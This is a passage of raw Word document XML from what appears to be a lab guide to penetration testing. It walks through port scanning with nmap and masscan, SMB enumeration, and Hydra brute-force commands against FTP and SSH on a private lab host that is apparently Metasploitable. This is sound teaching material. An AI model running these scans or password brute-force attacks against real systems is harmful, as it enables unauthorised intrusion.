      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p- 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F03A5F" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Service</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Version</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Detection</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EFC317D" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>sV</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p 22,80,443 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C038697" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:t>Detects the version of services on specific ports (in this case, SSH, HTTP, and HTTPS).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4F2434" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Aggressive</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Scanning</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Detailed</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Enumeration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D2C8E18" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -A 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11541932" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="6"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:t>Includes OS detection, service version detection, script scanning, and traceroute.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62574AE9" w14:textId="66574AF0" w:rsidR="00CA53D3" w:rsidRPr="000A7842" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49E1ABE1" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">2.2. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Masscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> for Fast Port Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718BAB68" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:t>Masscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:t xml:space="preserve"> is an extremely fast port scanner. It can be used to scan large networks quickly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0750EAB3" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00170A90">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>masscan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.1.10 -p0-65535</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4648905F" w14:textId="2908AE31" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="7"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:t>Scans all ports (0-65535) on the target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A58FD10" w14:textId="4D0F4AA4" w:rsidR="00CA53D3" w:rsidRPr="000A7842" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32F11C11" w14:textId="095AECF5" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00170A90">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>. ARP (Address Resolution Protocol) Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75645A0B" w14:textId="03E1D58D" w:rsidR="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:r w:rsidRPr="00CA53D3">
        <w:t>ARP scanning is useful to discover devices in a local network.</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA53D3">
        <w:br/>
        <w:t xml:space="preserve">For detecting ARP requests or responses on your local network, </w:t>
      </w:r>
      <w:r w:rsidRPr="00170A90">
        <w:t>we</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA53D3">
        <w:t xml:space="preserve"> can use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00170A90">
        <w:t>instead of Suricata.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DF553C9" w14:textId="1FC9F665" w:rsidR="00170A90" w:rsidRPr="00CA53D3" w:rsidRDefault="00170A90" w:rsidP="00CA53D3">
      <w:r>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25DF5354" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>2.5. Curl for HTTP Requests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="038C96C2" w14:textId="21FE3BAA" w:rsidR="00CA53D3" w:rsidRPr="000A7842" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:r w:rsidRPr="00CA53D3">
        <w:t xml:space="preserve">Curl can be used to test HTTP endpoints and send custom requests. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="438050C4" w14:textId="77777777" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3" w:rsidP="00CA53D3">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CA53D3">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> http://192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB36FA1" w14:textId="7371E82F" w:rsidR="00CA53D3" w:rsidRPr="00CA53D3" w:rsidRDefault="00CA53D3">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00CA53D3">
        <w:t>Sends a GET request to the web server running on port 80 of the target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A06FECD" w14:textId="4B026414" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00DD27AB" w:rsidP="00D1363F">
      <w:pPr>
        <w:pStyle w:val="TituloApartado1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r w:rsidR="00CA53D3">
        <w:t>Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60763A60" w14:textId="31439A5D" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:r w:rsidRPr="00D1363F">
        <w:t>Objective: Gather detailed information about services, users, and configurations on the target.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AA542F" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>3.1. FTP Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6C6AB6" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:r w:rsidRPr="00D1363F">
        <w:t>FTP is a common service for file transfers, and it can be tested for anonymous login or weak credentials.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1946A794" w14:textId="456EEC36" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t>Check for Anonymous Login</w:t>
      </w:r>
      <w:r w:rsidR="00170A90" w:rsidRPr="00170A90">
        <w:t xml:space="preserve"> (not working, just with credentials)</w:t>
      </w:r>
      <w:r w:rsidRPr="00D1363F">
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46979BFA" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00170A90">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ftp 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41479D09" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:lastRenderedPageBreak/>
        <w:t>Attempt to log in without a username and password to see if anonymous access is allowed. If successful, you may be able to interact with the file system.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73604C97" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Brute-Force FTP with Hydra:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50673364" w14:textId="17826468" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00170A90">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve">hydra -l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:t>msfadmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve"> -P </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00170A90">
        <w:t>hydraIncursion</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00170A90">
        <w:t xml:space="preserve">/random-passwords.txt </w:t>
      </w:r>
      <w:r w:rsidRPr="00D1363F">
        <w:t>ftp://192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222B6AF5" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="9"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve">Use Hydra to perform a dictionary-based brute-force attack on FTP, testing the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:t>msfadmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve"> username with a list of potential passwords.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76B2F47E" w14:textId="4B68B061" w:rsidR="00D1363F" w:rsidRPr="000A7842" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A5A8E84" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>3.2. SMB Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1A4AD4" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:r w:rsidRPr="00D1363F">
        <w:t>SMB (Server Message Block) is used for sharing files and printers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54517C10" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00170A90">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>enum4linux -a 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55116294" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t xml:space="preserve">This tool is used to enumerate SMB information such as user accounts, group memberships, and share details. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>The</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>flag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>runs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>enumeration</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>options</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16FFAFC5" w14:textId="0052AFB2" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A06D089" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>3.3. SSH Enumeration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227B0BE9" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="00D1363F">
      <w:r w:rsidRPr="00D1363F">
        <w:t>SSH (Secure Shell) is often used for remote login.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6584B1F3" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t>Test for Open SSH Port:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EAB9BFB" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p 22 192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="088BCAD2" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t>This checks if port 22 (SSH) is open.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F09D92" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t>Brute-Force SSH with Hydra:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD9EE97" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t>hydra -L /path/to/usernames.txt -P /path/to/passwordlist.txt ssh://192.168.1.10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A2D6C6" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:t>Use Hydra to perform a brute-force attack on SSH by trying a list of usernames (usernames.txt) and passwords (passwordlist.txt).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53161B15" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve">Manual SSH </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>Login</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1219D477" w14:textId="77777777" w:rsidR="00D1363F" w:rsidRPr="00D1363F" w:rsidRDefault="00D1363F" w:rsidP="000A7842">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D1363F">
        <w:rPr>
          <w:lang w:val="es-ES"/>
        </w:rPr>
        <w:t xml:space="preserve"> msfadmin@192.168.1.10</w:t>
      </w:r>
    </w:p>
